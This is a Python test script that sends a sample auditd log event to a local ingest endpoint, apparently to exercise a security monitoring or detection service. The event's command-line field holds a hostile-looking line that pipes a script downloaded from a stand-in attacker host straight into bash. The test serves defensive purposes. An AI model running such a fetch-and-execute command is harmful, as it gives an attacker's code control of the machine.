import httpx
import asyncio
import json

async def test_ingest():
    payload = {
        "agent_id": "agent-linux-01",
        "hostname": "prod-server-01",
        "log_type": "auditd",
        "cmdline": "wget http://evil.com/malware.sh | bash",
        "process_name": "bash",
        "user": "root",
        "timestamp": "2026-04-18T10:00:00Z"
    }

    async with httpx.AsyncClient() as client:
        response = await client.post("http://localhost:8000/ingest/log", json=payload)
        print("Status:", response.status_code)
        print("Response:", response.text)

if __name__ == "__main__":
    asyncio.run(test_ingest())
